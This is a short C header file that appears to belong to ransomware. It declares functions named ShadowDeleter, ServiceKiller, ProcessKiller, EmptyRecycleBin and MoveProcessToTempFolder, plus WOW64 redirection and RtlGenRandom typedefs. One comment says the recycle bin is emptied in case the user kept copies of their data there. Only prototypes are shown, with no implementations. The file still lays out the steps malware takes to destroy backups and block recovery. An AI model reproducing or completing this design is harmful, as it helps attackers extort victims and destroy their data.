#pragma once


BOOL myIsWow64Process();

typedef BOOL (WINAPI*pdef_IsWow64Process)
(
	HANDLE hProcess,
	PBOOL bResult
);
typedef BOOL (WINAPI *pdef_Wow64DisableWow64FsRedirection)
(
	PVOID* OldValue
);

typedef BOOL (WINAPI*pdef_Wow64RevertWow64FsRedirection)
(
	PVOID OldValue
);

typedef BOOL (WINAPI*pdef_RtlGenRandom)
(
	PVOID RandomBuffer,
	ULONG RandomBufferLength
);

VOID ShadowDeleter();

// Move Process To Temp Folder
BOOL MoveProcessToTempFolder();


VOID ServiceKiller();

VOID ProcessKiller();

// Empty Recycle Bin just in case if user have copy of there data in Recycle Bin
VOID EmptyRecycleBin();


//Checking For Current Process
VOID IsProcessRunning();